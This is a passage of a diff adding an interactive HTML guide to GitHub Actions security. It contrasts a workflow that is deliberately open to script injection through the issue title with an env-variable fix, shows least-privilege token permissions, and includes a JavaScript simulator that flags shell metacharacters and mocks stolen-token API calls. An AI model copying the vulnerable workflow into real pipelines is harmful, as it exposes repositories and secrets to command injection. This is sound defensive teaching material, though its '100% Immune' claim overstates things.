+            <div style="background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 1rem;">
+              <h4 style="color: #6EE7B7; font-size: 0.9rem; margin-bottom: 0.4rem;">3. Environment Variable (`env:`)</h4>
+              <div class="code-container" style="font-size: 0.78rem; margin: 0.3rem 0;">
+env:
+  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+run: gh issue edit 42
+              </div>
+              <p style="font-size: 0.8rem; color: var(--text-dim);">Exported to process environment for CLIs like GitHub CLI (`gh`).</p>
+            </div>
+          </div>
+
+          <h3 style="font-size: 1.1rem; color: #FFF; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
+            <i class="fa-solid fa-user-ninja" style="color: var(--accent-rose);"></i> Simulated Attacker API Attack Suite
+          </h3>
+          <p style="font-size: 0.88rem; color: var(--text-muted); margin-bottom: 1rem;">
+            If an attacker steals <code>secrets.GITHUB_TOKEN</code> from this job, click the buttons below to simulate what GitHub's API server will respond:
+          </p>
+
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 0.75rem; margin-bottom: 1.25rem;">
+            <button class="chip-btn" style="padding: 0.6rem 1rem; border-radius: 10px; font-weight: 600;" onclick="testApiCall('contents')">
+              <i class="fa-solid fa-code-branch"></i> Attempt Push to `main` branch
+            </button>
+            <button class="chip-btn" style="padding: 0.6rem 1rem; border-radius: 10px; font-weight: 600;" onclick="testApiCall('packages')">
+              <i class="fa-solid fa-box"></i> Attempt Publish NPM Package
+            </button>
+            <button class="chip-btn" style="padding: 0.6rem 1rem; border-radius: 10px; font-weight: 600;" onclick="testApiCall('issues')">
+              <i class="fa-solid fa-tag"></i> Attempt Add Label to Issue
+            </button>
+            <button class="chip-btn" style="padding: 0.6rem 1rem; border-radius: 10px; font-weight: 600;" onclick="testApiCall('id-token')">
+              <i class="fa-solid fa-key"></i> Attempt Mint AWS OIDC Token
+            </button>
+          </div>
+
+          <div id="apiTestConsole" class="code-container" style="background: #090D16; min-height: 90px; color: #9CA3AF;">
+            Click any attack test button above to simulate GitHub API authorization check...
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 5: Workspace Project Files Comparison -->
+    <div id="code-compare" class="tab-content">
+      <div class="glass-card">
+        <h2 class="card-title"><i class="fa-solid fa-code-compare" style="color: var(--accent-emerald);"></i> Project Workflow Files Comparison</h2>
+        <p class="card-desc">Compare the exact <code>script-injection.yml</code> file from <strong>01 Starting Project</strong> (Vulnerable) vs <strong>02 Finished Project</strong> (Fixed &amp; Secured).</p>
+
+        <!-- Side by Side Workflow Viewer -->
+        <div class="output-comparison" style="margin-top: 1.5rem;">
+          <!-- 01 Starting Project Code -->
+          <div class="output-panel output-bad">
+            <div class="panel-header" style="color: var(--accent-rose);">
+              <i class="fa-solid fa-file-circle-xmark"></i> 01 Starting Project (Vulnerable)
+            </div>
+            <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">
+              Path: <code>01 Starting Project/.github/workflows/script-injection.yml</code>
+            </p>
+            <div class="code-container code-vulnerable" style="white-space: pre; font-size: 0.85rem; line-height: 1.5;">
+<span class="code-key">name:</span> Label Issues (Script Injection Example)
+<span class="code-key">on:</span>
+  <span class="code-key">issues:</span>
+    <span class="code-key">types:</span>
+      - opened
+<span class="code-key">jobs:</span>
+  <span class="code-key">assign-label:</span>
+    <span class="code-key">runs-on:</span> ubuntu-latest
+    <span class="code-key">steps:</span>
+      - <span class="code-key">name:</span> Assign label
+        <span class="code-key">run:</span> |
+<span class="code-danger">          issue_title="${{ github.event.issue.title }}"</span>
+          if [[ "$issue_title" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+            </div>
+            <div style="background: rgba(244, 63, 94, 0.1); border: 1px solid rgba(244, 63, 94, 0.25); border-radius: 8px; padding: 0.75rem; font-size: 0.82rem; color: #FDA4AF; margin-top: 0.75rem;">
+              <strong>⚠️ Line 12 Security Flaw:</strong> Direct inline expression evaluation (<code>"${{ github.event.issue.title }}"</code>). Allows raw bash injection if title contains quotes or command separators.
+            </div>
+          </div>
+
+          <!-- 02 Finished Project Code -->
+          <div class="output-panel output-good">
+            <div class="panel-header" style="color: var(--accent-emerald);">
+              <i class="fa-solid fa-file-circle-check"></i> 02 Finished Project (Secured)
+            </div>
+            <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">
+              Path: <code>02 Finished Project/.github/workflows/script-injection.yml</code>
+            </p>
+            <div class="code-container code-secure" style="white-space: pre; font-size: 0.85rem; line-height: 1.5;">
+<span class="code-key">name:</span> Label Issues (Script Injection Example)
+<span class="code-key">on:</span>
+  <span class="code-key">issues:</span>
+    <span class="code-key">types:</span>
+      - opened
+<span class="code-key">jobs:</span>
+  <span class="code-key">assign-label:</span>
+    <span class="code-key">runs-on:</span> ubuntu-latest
+    <span class="code-key">steps:</span>
+      - <span class="code-key">name:</span> Assign label
+<span class="code-safe">        env:</span>
+<span class="code-safe">          TITLE: ${{ github.event.issue.title }}</span>
+        <span class="code-key">run:</span> |
+<span class="code-safe">          if [[ "$TITLE" == *"bug"* ]]; then</span>
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+            </div>
+            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: 8px; padding: 0.75rem; font-size: 0.82rem; color: #6EE7B7; margin-top: 0.75rem;">
+              <strong>🛡️ Lines 11-14 Security Fix:</strong> Input passed into step via <code>env: TITLE</code> variable. Bash evaluates <code>$TITLE</code> as a literal string payload, rendering injection attempts completely harmless.
+            </div>
+          </div>
+        </div>
+
+        <table class="comp-table">
+          <thead>
+            <tr>
+              <th>Security Aspect</th>
+              <th>01 Starting Project (Vulnerable)</th>
+              <th>02 Finished Project (Secured)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Payload Context</strong></td>
+              <td>Evaluated directly into script text before shell compilation.</td>
+              <td>Stored in process environment table before script execution.</td>
+            </tr>
+            <tr>
+              <td><strong>Metacharacter Evaluation</strong></td>
+              <td>
+                <span class="code-danger">Executes <code>;</code>, <code>&amp;&amp;</code>, <code>|</code> as shell commands</span>
+              </td>
+              <td>
+                <span class="code-safe">Treats all characters as literal string text</span>
+              </td>
+            </tr>
+            <tr>
+              <td><strong>Attack Immunity</strong></td>
+              <td>Vulnerable to Arbitrary Code Execution & Secret Theft.</td>
+              <td>100% Immune to Script Injection Attacks.</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- Real Issue Labeling Workflow Comparison -->
+        <h3 style="color: #FFF; font-size: 1.3rem; margin-top: 3rem; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
+          <i class="fa-solid fa-key" style="color: var(--accent-purple);"></i> Permissions Workflow (`label-issues-real.yml`)
+        </h3>
+        <p class="card-desc">Compare how declaring fine-grained permissions restricts the automatic <code>GITHUB_TOKEN</code> to prevent repository-wide compromise.</p>
+
+        <div class="output-comparison" style="margin-top: 1rem;">
+          <!-- 01 Starting Project label-issues-real.yml -->
+          <div class="output-panel output-bad">
+            <div class="panel-header" style="color: var(--accent-rose);">
+              <i class="fa-solid fa-file-circle-xmark"></i> 01 Starting Project (Implicit Write-All)
+            </div>
+            <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">
+              Path: <code>01 Starting Project/.github/workflows/label-issues-real.yml</code>
+            </p>
+            <div class="code-container code-vulnerable" style="white-space: pre-wrap; word-break: break-all; font-size: 0.85rem; line-height: 1.5;">
+<span class="code-key">name:</span> Label Issues (Permissions Example)
+<span class="code-key">on:</span>
+  <span class="code-key">issues:</span>
+    <span class="code-key">types:</span>
+      - opened
+<span class="code-key">jobs:</span>
+  <span class="code-key">assign-label:</span>
+<span class="code-danger">    # ❌ NO permissions block declared here!</span>
+<span class="code-danger">    # Token defaults to full repo-wide read/write permissions</span>
+    <span class="code-key">runs-on:</span> ubuntu-latest
+    <span class="code-key">steps:</span>
+      - <span class="code-key">name:</span> Assign label
+        <span class="code-key">if:</span> contains(github.event.issue.title, 'bug')
+        <span class="code-key">run:</span> |
+          curl -X POST \
+          --url https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.issue.number }}/labels \
+          -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          -H 'content-type: application/json' \
+          -d '{"labels": ["bug"]}' --fail
+            </div>
+            <div style="background: rgba(244, 63, 94, 0.1); border: 1px solid rgba(244, 63, 94, 0.25); border-radius: 8px; padding: 0.75rem; font-size: 0.82rem; color: #FDA4AF; margin-top: 0.75rem;">
+              <strong>⚠️ Implicit Permission Flaw:</strong> Without a <code>permissions:</code> block, the <code>GITHUB_TOKEN</code> has write access to repository contents, packages, &amp; actions.
+            </div>
+          </div>
+
+          <!-- 02 Finished Project label-issues-real.yml -->
+          <div class="output-panel output-good">
+            <div class="panel-header" style="color: var(--accent-emerald);">
+              <i class="fa-solid fa-file-circle-check"></i> 02 Finished Project (Explicit Least Privilege)
+            </div>
+            <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">
+              Path: <code>02 Finished Project/.github/workflows/label-issues-real.yml</code>
+            </p>
+            <div class="code-container code-secure" style="white-space: pre-wrap; word-break: break-all; font-size: 0.85rem; line-height: 1.5;">
+<span class="code-key">name:</span> Label Issues (Permissions Example)
+<span class="code-key">on:</span>
+  <span class="code-key">issues:</span>
+    <span class="code-key">types:</span>
+      - opened
+<span class="code-key">jobs:</span>
+  <span class="code-key">assign-label:</span>
+<span class="code-safe">    permissions:</span>
+<span class="code-safe">      issues: write # 🟢 EXPLICIT SCOPE LIMITATION</span>
+    <span class="code-key">runs-on:</span> ubuntu-latest
+    <span class="code-key">steps:</span>
+      - <span class="code-key">name:</span> Assign label
+        <span class="code-key">if:</span> contains(github.event.issue.title, 'bug')
+        <span class="code-key">run:</span> |
+          curl -X POST \
+          --url https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.issue.number }}/labels \
+          -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          -H 'content-type: application/json' \
+          -d '{"labels": ["bug"]}' --fail
+            </div>
+            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: 8px; padding: 0.75rem; font-size: 0.82rem; color: #6EE7B7; margin-top: 0.75rem;">
+              <strong>🛡️ Lines 8-9 Hardening:</strong> Declares <code>permissions: issues: write</code>. Token is granted write access ONLY to issue labels. Any attempt to modify code returns <code>403 Forbidden</code>.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+      <p>GitHub Actions Security Guide &bull; Designed for Pair-Programming &amp; Mastery</p>
+    </footer>
+  </div>
+
+  <script>
+    // Tab Switching Logic
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+
+      document.getElementById(tabId).classList.add('active');
+      event.currentTarget.classList.add('active');
+    }
+
+    // Script Injection Simulator Logic
+    const simInput = document.getElementById('simPayload');
+    const vulnYamlCode = document.getElementById('vulnYamlCode');
+    const vulnBashStream = document.getElementById('vulnBashStream');
+    const vulnStatus = document.getElementById('vulnStatus');
+    const safeBashStream = document.getElementById('safeBashStream');
+    const safeStatus = document.getElementById('safeStatus');
+
+    function updateSimulation() {
+      const val = simInput.value;
+      
+      // Vulnerable update
+      vulnYamlCode.textContent = `"${val}"`;
+      
+      let bashStreamText = `Line 1: title="${val}"\n`;
+      let isExploited = false;
+
+      if (val.includes('"') || val.includes(';') || val.includes('&&') || val.includes('|')) {
+        isExploited = true;
+        bashStreamText += `⚠️ EXPLOIT DETECTED IN BASH PARSER:\n`;
+        bashStreamText += `--> Shell terminates variable string at first quote\n`;
+        bashStreamText += `--> Shell executes injected payload as raw system commands!\n`;
+      } else {
+        bashStreamText += `Line 2: Evaluating condition [[ "$title" == *"bug"* ]]`;
+      }
+
+      vulnBashStream.textContent = bashStreamText;
+
+      if (isExploited) {
+        vulnStatus.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> ATTACK SUCCESSFUL: Arbitrary code execution & secret leak triggered!`;
+      } else {
+        vulnStatus.innerHTML = `<i class="fa-solid fa-circle-check"></i> Clean execution (No shell metacharacters detected)`;
+      }
+
+      // Safe update
+      safeBashStream.textContent = `Environment Table:\n  TITLE = ${JSON.stringify(val)}\n\nBash Command:\n  [[ "$TITLE" == *"bug"* ]]\n--> Variable evaluated strictly as a literal string. Zero code execution.`;
+      safeStatus.innerHTML = `<i class="fa-solid fa-shield-check"></i> SECURE: Environment variable encapsulation rendered payload completely harmless.`;
+    }
+
+    function setPayload(text) {
+      simInput.value = text;
+      updateSimulation();
+    }
+
+    simInput.addEventListener('input', updateSimulation);
+    updateSimulation();
+
+    // Permissions Generator & Exploit Simulator Logic
+    const permissionsList = [
+      { key: 'issues', label: 'issues', default: 'write' },
+      { key: 'contents', label: 'contents', default: 'write' },
+      { key: 'pull-requests', label: 'pull-requests', default: 'write' },
+      { key: 'actions', label: 'actions', default: 'write' },
+      { key: 'packages', label: 'packages', default: 'write' },
+      { key: 'id-token', label: 'id-token (OIDC)', default: 'write' },
+      { key: 'security-events', label: 'security-events', default: 'write' }
+    ];
+
+    const permContainer = document.getElementById('permContainer');
+    const yamlPermOutput = document.getElementById('yamlPermOutput');
+    const tokenStateTitle = document.getElementById('tokenStateTitle');
+    const tokenPowerValue = document.getElementById('tokenPowerValue');
+    const tokenPowerBar = document.getElementById('tokenPowerBar');
+    const apiTestConsole = document.getElementById('apiTestConsole');
+
+    const activePerms = {
+      'issues': 'write'
+    };
+
+    function renderPerms() {
+      permContainer.innerHTML = '';
+      permissionsList.forEach(p => {
+        const isSelected = activePerms[p.key] !== undefined;
+        const item = document.createElement('div');
+        item.className = `perm-item ${isSelected ? 'active' : ''}`;
+        item.innerHTML = `
+          <span>${p.label}: ${isSelected ? activePerms[p.key] : 'none'}</span>
+          <div class="toggle-switch"></div>
+        `;
+        item.onclick = () => {
+          if (isSelected) {
+            delete activePerms[p.key];
+          } else {
+            activePerms[p.key] = p.default;
+          }
+          renderPerms();
+        };
+        permContainer.appendChild(item);
+      });
+
+      // Update YAML
+      const keys = Object.keys(activePerms);
+      let yaml = `<span class="code-comment"># Job Permissions Block</span><br>`;
+      yaml += `<span class="code-key">permissions:</span><br>`;
+
+      if (keys.length === 0) {
+        yaml += `&nbsp;&nbsp;<span class="code-string">{}</span> <span class="code-comment"># Disables all permissions (Maximum security: 0 Scope)</span>`;
+      } else {
+        keys.forEach(k => {
+          yaml += `&nbsp;&nbsp;<span class="code-var">${k}:</span> <span class="code-string">${activePerms[k]}</span><br>`;
+        });
+      }
+
+      yamlPermOutput.innerHTML = yaml;
+
+      // Update Token Power & Status Gauge
+      const totalPossible = permissionsList.length;
+      const activeCount = keys.length;
+      const powerPct = Math.round((activeCount / totalPossible) * 100);
+
+      tokenPowerValue.textContent = `${powerPct}% Power (${activeCount}/${totalPossible} Scopes)`;
+      tokenPowerBar.style.width = `${powerPct}%`;
+
+      if (powerPct === 0) {
+        tokenStateTitle.innerHTML = `<span style="color: #6EE7B7;"><i class="fa-solid fa-lock"></i> Locked Down (Zero Trust)</span>`;
+        tokenPowerBar.style.background = 'linear-gradient(90deg, #10B981, #06B6D4)';
+      } else if (powerPct <= 30) {
+        tokenStateTitle.innerHTML = `<span style="color: #67E8F9;"><i class="fa-solid fa-shield"></i> Hardened (Least Privilege)</span>`;
+        tokenPowerBar.style.background = 'linear-gradient(90deg, #06B6D4, #3B82F6)';
+      } else if (powerPct <= 70) {
+        tokenStateTitle.innerHTML = `<span style="color: #FCD34D;"><i class="fa-solid fa-triangle-exclamation"></i> Moderate Exposure</span>`;
+        tokenPowerBar.style.background = 'linear-gradient(90deg, #F59E0B, #8B5CF6)';
+      } else {
+        tokenStateTitle.innerHTML = `<span style="color: #FDA4AF;"><i class="fa-solid fa-biohazard"></i> HIGH BLAST RADIUS (Overly Permissive)</span>`;
+        tokenPowerBar.style.background = 'linear-gradient(90deg, #F43F5E, #EF4444)';
+      }
+    }
+
+    function testApiCall(targetScope) {
+      const hasPerm = activePerms[targetScope] !== undefined;
+      const permValue = activePerms[targetScope] || 'none';
+
+      let output = `REQUEST: HTTP POST /api.github.com/v3/${targetScope}/resource\n`;
+      output += `AUTHENTICATION: Bearer GITHUB_TOKEN (Job Session)\n--------------------------------------------------\n`;
+
+      if (hasPerm && (permValue === 'write' || permValue === 'read')) {
+        output += `STATUS: 201 Created / 200 OK\n`;
+        output += `RESPONSE: {\n  "status": "success",\n  "scope": "${targetScope}:${permValue}",\n  "message": "API action executed successfully!"\n}\n`;
+        output += `\n⚠️ RESULT: Attacker SUCCESSFULLY leveraged GITHUB_TOKEN for '${targetScope}' operations!`;
+        apiTestConsole.style.color = '#FDA4AF';
+        apiTestConsole.style.borderColor = 'rgba(244, 63, 94, 0.4)';
+      } else {
+        output += `STATUS: 403 Forbidden\n`;
+        output += `RESPONSE: {\n  "message": "Resource not accessible by integration",\n  "documentation_url": "https://docs.github.com/rest/overview/permissions-required-for-github-apps"\n}\n`;
+        output += `\n🛡️ RESULT: GitHub OAuth Engine REJECTED attack attempt! Scope '${targetScope}' is blocked.`;
+        apiTestConsole.style.color = '#6EE7B7';
+        apiTestConsole.style.borderColor = 'rgba(16, 185, 129, 0.4)';
+      }
+
+      apiTestConsole.textContent = output;
+    }
+
+    renderPerms();
+  </script>
+</body>
+</html>
